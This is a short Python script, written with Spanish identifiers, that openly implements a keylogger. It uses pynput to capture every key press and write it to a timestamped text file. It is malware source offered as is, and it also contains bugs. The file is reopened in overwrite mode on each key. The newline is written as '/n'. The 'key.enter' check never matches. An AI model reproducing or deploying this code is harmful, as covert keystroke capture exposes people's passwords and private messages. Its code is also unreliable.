import datetime
from pynput.keyboard import Listener


fecha = datetime.datetime.now().strftime('%d-%m-%Y %H-%M-%S')


def grabarDatos(key):

    archivoConLosDatos = open('keylogger_{}.txt'.format(fecha), 'w')
    key = str(key)

    if key == 'key.enter':
        archivoConLosDatos.write('/n')
    elif key == 'Key.space':
        archivoConLosDatos.write(' ')
    elif key == 'Key.backspace':
        archivoConLosDatos.write('%BORRAR%')
    else:
        archivoConLosDatos.write(key.replace( "'", ""))



with Listener(on_press = grabarDatos) as l:
    l.join()


